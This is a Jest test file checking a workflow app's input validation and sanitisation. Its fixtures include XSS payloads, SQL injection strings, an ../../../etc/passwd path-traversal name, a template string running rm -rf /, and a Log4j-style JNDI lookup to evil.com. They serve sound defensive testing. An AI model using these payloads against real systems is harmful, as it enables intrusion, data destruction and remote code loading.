/**
 * Security Validation Tests for Workflow
 * Tests all security fixes and validates against vulnerabilities
 */

import { describe, it, expect } from '@jest/globals';
import { 
  validateFile, 
  validateBriefData, 
  validateMotivations,
  sanitizeApiResponse 
} from '@/lib/validation/workflow-validation';
import { WorkflowErrorBoundary } from '@/components/workflow/ErrorBoundary';

describe('Workflow Security Validation', () => {
  describe('Input Validation and Sanitization', () => {
    describe('File Upload Security', () => {
      it('should reject executable files', () => {
        const maliciousFile = new File(['malicious content'], 'virus.exe', { 
          type: 'application/x-executable' 
        });
        
        const validation = validateFile(maliciousFile);
        expect(validation.valid).toBe(false);
        expect(validation.errors).toContain('File type not allowed for security reasons');
      });

      it('should reject files with path traversal attempts', () => {
        const pathTraversalFile = new File(['content'], '../../../etc/passwd', { 
          type: 'text/plain' 
        });
        
        const validation = validateFile(pathTraversalFile);
        expect(validation.valid).toBe(false);
        expect(validation.errors).toContain('File name contains invalid path characters');
      });

      it('should reject oversized files', () => {
        const oversizedContent = 'x'.repeat(11 * 1024 * 1024); // 11MB
        const oversizedFile = new File([oversizedContent], 'large.pdf', { 
          type: 'application/pdf' 
        });
        
        const validation = validateFile(oversizedFile);
        expect(validation.valid).toBe(false);
      });

      it('should accept valid files', () => {
        const validFile = new File(['valid content'], 'document.pdf', { 
          type: 'application/pdf' 
        });
        
        const validation = validateFile(validFile);
        expect(validation.valid).toBe(true);
        expect(validation.errors).toHaveLength(0);
      });
    });

    describe('XSS Prevention', () => {
      it('should sanitize HTML in brief data', () => {
        const maliciousBrief = {
          title: '<script>alert("XSS")</script>Legitimate Title',
          objective: 'Test objective<img src="x" onerror="alert(1)">',
          targetAudience: 'Target audience<iframe src="javascript:alert(1)"></iframe>',
          keyMessages: ['<script>malicious()</script>Message 1', 'Clean message'],
          platforms: ['Facebook<script>hack()</script>', 'Instagram'],
          budget: '$10,000<script>steal()</script>',
          timeline: '2 weeks<svg onload="alert(1)">'
        };

        const validation = validateBriefData(maliciousBrief);
        expect(validation.valid).toBe(true);
        
        if (validation.data) {
          expect(validation.data.title).not.toContain('<script>');
          expect(validation.data.title).not.toContain('alert');
          expect(validation.data.objective).not.toContain('<img');
          expect(validation.data.objective).not.toContain('onerror');
          expect(validation.data.targetAudience).not.toContain('<iframe');
          expect(validation.data.targetAudience).not.toContain('javascript:');
          expect(validation.data.keyMessages[0]).not.toContain('<script>');
          expect(validation.data.platforms[0]).not.toContain('<script>');
          expect(validation.data.budget).not.toContain('<script>');
          expect(validation.data.timeline).not.toContain('<svg');
        }
      });

      it('should sanitize JavaScript protocols', () => {
        const maliciousData = {
          title: 'javascript:alert("XSS")',
          objective: 'data:text/html,<script>alert(1)</script>',
          targetAudience: 'vbscript:msgbox("XSS")',
          keyMessages: ['javascript:void(0)'],
          platforms: ['data:image/svg+xml,<svg onload="alert(1)">'],
          budget: '$10,000',
          timeline: '2 weeks'
        };

        const validation = validateBriefData(maliciousData);
        expect(validation.valid).toBe(true);
        
        if (validation.data) {
          expect(validation.data.title).not.toContain('javascript:');
          expect(validation.data.objective).not.toContain('data:');
          expect(validation.data.targetAudience).not.toContain('vbscript:');
          expect(validation.data.keyMessages[0]).not.toContain('javascript:');
          expect(validation.data.platforms[0]).not.toContain('data:');
        }
      });

      it('should sanitize event handlers', () => {
        const maliciousData = {
          title: 'Title onclick="alert(1)"',
          objective: 'Objective onmouseover="steal()"',
          targetAudience: 'Audience onfocus="hack()"',
          keyMessages: ['Message onload="malicious()"'],
          platforms: ['Platform onerror="exploit()"'],
          budget: '$10,000',
          timeline: '2 weeks'
        };

        const validation = validateBriefData(maliciousData);
        expect(validation.valid).toBe(true);
        
        if (validation.data) {
          expect(validation.data.title).not.toMatch(/on\w+\s*=/i);
          expect(validation.data.objective).not.toMatch(/on\w+\s*=/i);
          expect(validation.data.targetAudience).not.toMatch(/on\w+\s*=/i);
          expect(validation.data.keyMessages[0]).not.toMatch(/on\w+\s*=/i);
          expect(validation.data.platforms[0]).not.toMatch(/on\w+\s*=/i);
        }
      });
    });

    describe('SQL Injection Prevention', () => {
      it('should sanitize SQL injection attempts in text fields', () => {
        const sqlInjectionData = {
          title: "'; DROP TABLE users; --",
          objective: "1' OR '1'='1",
          targetAudience: "admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users--",
          keyMessages: ["'; INSERT INTO admin VALUES ('hacker', 'password'); --"],
          platforms: ["1' AND (SELECT COUNT(*) FROM users) > 0 --"],
          budget: '$10,000',
          timeline: '2 weeks'
        };

        const validation = validateBriefData(sqlInjectionData);
        expect(validation.valid).toBe(true);
        
        if (validation.data) {
          // SQL injection patterns should be sanitized
          expect(validation.data.title).not.toContain('DROP TABLE');
          expect(validation.data.objective).not.toContain("1'='1");
          expect(validation.data.targetAudience).not.toContain('UNION');
          expect(validation.data.keyMessages[0]).not.toContain('INSERT INTO');
          expect(validation.data.platforms[0]).not.toContain('SELECT COUNT');
        }
      });
    });

    describe('API Response Sanitization', () => {
      it('should sanitize malicious content in API responses', () => {
        const maliciousResponse = {
          data: [
            {
              title: '<script>alert("XSS")</script>Motivation',
              description: 'Description<img src="x" onerror="alert(1)">',
              metadata: {},
        source: 'javascript:alert("hack")',
                tags: ['<script>malicious()</script>', 'clean-tag']
              
      }
            }
          ],
          message: 'Success<iframe src="javascript:alert(1)"></iframe>'
        };

        const sanitized = sanitizeApiResponse(maliciousResponse);
        
        expect(sanitized.data[0].title).not.toContain('<script>');
        expect(sanitized.data[0].description).not.toContain('<img');
        expect(sanitized.data[0].metadata.source).not.toContain('javascript:');
        expect(sanitized.data[0].metadata.tags[0]).not.toContain('<script>');
        expect(sanitized.message).not.toContain('<iframe');
      });
    });
  });

  describe('Error Information Disclosure Prevention', () => {
    it('should not expose sensitive information in production errors', () => {
      // Mock production environment
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      try {
        const sensitiveError = new Error('Database connection failed: password=secret123, host=internal.db.com');
        
        // Test error boundary sanitization
        const errorBoundary = new WorkflowErrorBoundary({ children: null });
        const sanitized = (errorBoundary as WorkflowErrorBoundary & { sanitizeErrorForProduction: (error: Error) => { message: string } }).sanitizeErrorForProduction(sensitiveError);
        
        expect(sanitized.message).not.toContain('password');
        expect(sanitized.message).not.toContain('secret123');
        expect(sanitized.message).not.toContain('internal.db.com');
        expect(sanitized.message).toBe('An unexpected error occurred. Please try again or contact support.');
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });

    it('should provide detailed errors in development', () => {
      // Mock development environment
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'development';

      try {
        const detailedError = new Error('Detailed development error message');
        
        const errorBoundary = new WorkflowErrorBoundary({ children: null });
        const result = (errorBoundary as WorkflowErrorBoundary & { sanitizeErrorForProduction: (error: Error) => { message: string } }).sanitizeErrorForProduction(detailedError);
        
        expect(result.message).toBe('Detailed development error message');
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });

    it('should sanitize common sensitive patterns', () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      try {
        const errorBoundary = new WorkflowErrorBoundary({ children: null });
        
        const sensitiveErrors = [
          new Error('API key validation failed: sk-1234567890'),
          new Error('Database connection error: user=admin password=secret'),
          new Error('Internal server error: /etc/passwd not found'),
          new Error('Token expired: jwt_secret_key_here'),
          new Error('Permission denied: access to /internal/admin')
        ];

        for (const error of sensitiveErrors) {
          const sanitized = (errorBoundary as WorkflowErrorBoundary & { sanitizeErrorForProduction: (error: Error) => { message: string } }).sanitizeErrorForProduction(error);
          expect(sanitized.message).toBe('An unexpected error occurred. Please try again or contact support.');
        }
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });
  });

  describe('Rate Limiting Security', () => {
    it('should prevent abuse through rate limiting', async () => {
      // This would be tested with the actual rate limiter
      // For now, we'll test the validation logic
      const { validateAIOperationRate } = await import('@/lib/validation/workflow-validation');
      
      const result = validateAIOperationRate('test-user', 'generate-motivations');
      expect(result).toHaveProperty('allowed');
      expect(result).toHaveProperty('resetTime');
    });
  });

  describe('Input Length Validation', () => {
    it('should reject excessively long inputs', () => {
      const excessivelyLongData = {
        title: 'x'.repeat(300), // Exceeds 200 char limit
        objective: 'x'.repeat(3000), // Exceeds 2000 char limit
        targetAudience: 'x'.repeat(1500), // Exceeds 1000 char limit
        keyMessages: ['x'.repeat(600)], // Exceeds 500 char limit
        platforms: ['x'.repeat(100)], // Exceeds 50 char limit
        budget: '$10,000',
        timeline: '2 weeks'
      };

      const validation = validateBriefData(excessivelyLongData);
      expect(validation.valid).toBe(false);
      expect(validation.errors.length).toBeGreaterThan(0);
    });

    it('should reject too many array items', () => {
      const tooManyItemsData = {
        title: 'Valid Title',
        objective: 'Valid objective',
        targetAudience: 'Valid audience',
        keyMessages: Array(15).fill('Message'), // Exceeds 10 item limit
        platforms: Array(15).fill('Platform'), // Exceeds 10 item limit
        budget: '$10,000',
        timeline: '2 weeks'
      };

      const validation = validateBriefData(tooManyItemsData);
      expect(validation.valid).toBe(false);
      expect(validation.errors.length).toBeGreaterThan(0);
    });
  });

  describe('UUID Validation', () => {
    it('should validate proper UUID format', () => {
      const validMotivations = [
        {
          id: '123e4567-e89b-12d3-a456-426614174000', // Valid UUID
          title: 'Valid Motivation',
          description: 'Valid description',
          score: 0.8,
          selected: false
        }
      ];

      const validation = validateMotivations(validMotivations);
      expect(validation.valid).toBe(true);
    });

    it('should reject invalid UUID formats', () => {
      const invalidMotivations = [
        {
          id: 'not-a-uuid', // Invalid UUID
          title: 'Invalid Motivation',
          description: 'Invalid description',
          score: 0.8,
          selected: false
        }
      ];

      const validation = validateMotivations(invalidMotivations);
      expect(validation.valid).toBe(false);
      expect(validation.errors.length).toBeGreaterThan(0);
    });
  });

  describe('Numeric Validation', () => {
    it('should validate score ranges', () => {
      const invalidScoreMotivations = [
        {
          id: '123e4567-e89b-12d3-a456-426614174000',
          title: 'Invalid Score Motivation',
          description: 'Description',
          score: 1.5, // Invalid: > 1
          selected: false
        }
      ];

      const validation = validateMotivations(invalidScoreMotivations);
      expect(validation.valid).toBe(false);
    });

    it('should reject negative scores', () => {
      const negativeScoreMotivations = [
        {
          id: '123e4567-e89b-12d3-a456-426614174000',
          title: 'Negative Score Motivation',
          description: 'Description',
          score: -0.1, // Invalid: < 0
          selected: false
        }
      ];

      const validation = validateMotivations(negativeScoreMotivations);
      expect(validation.valid).toBe(false);
    });
  });

  describe('Content Security', () => {
    it('should prevent code injection in text fields', () => {
      const codeInjectionData = {
        title: 'Marketing campaign ${process.env.SECRET_KEY}',
        objective: 'Our goal is to #{7*7} increase brand awareness', // Template injection
        targetAudience: 'Target users are {{constructor.constructor("alert(1)")()}} interested in our product',
        keyMessages: ['Our message is <%= system("rm -rf /") %> about quality'],
        platforms: ['We will use ${jndi:ldap://evil.com/a} social media'], // Log4j style injection
        budget: '$10,000',
        timeline: '2 weeks'
      };

      const validation = validateBriefData(codeInjectionData);
      expect(validation.valid).toBe(true);
      
      if (validation.data) {
        // Template injection patterns should be sanitized
        expect(validation.data.title).not.toContain('${');
        expect(validation.data.objective).not.toContain('#{');
        expect(validation.data.targetAudience).not.toContain('{{');
        expect(validation.data.keyMessages[0]).not.toContain('<%=');
        expect(validation.data.platforms[0]).not.toContain('${jndi:');
      }
    });

    it('should handle null and undefined inputs safely', () => {
      const nullData = {
        title: null,
        objective: undefined,
        targetAudience: '',
        keyMessages: [null, undefined, ''],
        platforms: [],
        budget: null,
        timeline: undefined
      };

      // Should not throw errors and should handle gracefully
      expect(() => {
        validateBriefData(nullData);
      }).not.toThrow();
    });
  });

  describe('File Type Validation', () => {
    it('should only allow specific MIME types', () => {
      const allowedTypes = [
        'application/pdf',
        'application/msword',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'text/plain'
      ];

      const disallowedTypes = [
        'application/javascript',
        'text/html',
        'image/svg+xml',
        'application/x-executable',
        'application/octet-stream'
      ];

      for (const type of allowedTypes) {
        const file = new File(['content'], 'test.file', { type });
        const validation = validateFile(file);
        expect(validation.valid).toBe(true);
      }

      for (const type of disallowedTypes) {
        const file = new File(['content'], 'test.file', { type });
        const validation = validateFile(file);
        expect(validation.valid).toBe(false);
      }
    });
  });

  describe('Security Headers and CSP', () => {
    it('should validate that security measures are in place', () => {
      // This would typically test actual HTTP headers in an integration test
      // For now, we'll verify that our validation functions exist and work
      expect(validateFile).toBeDefined();
      expect(validateBriefData).toBeDefined();
      expect(sanitizeApiResponse).toBeDefined();
    });
  });
});
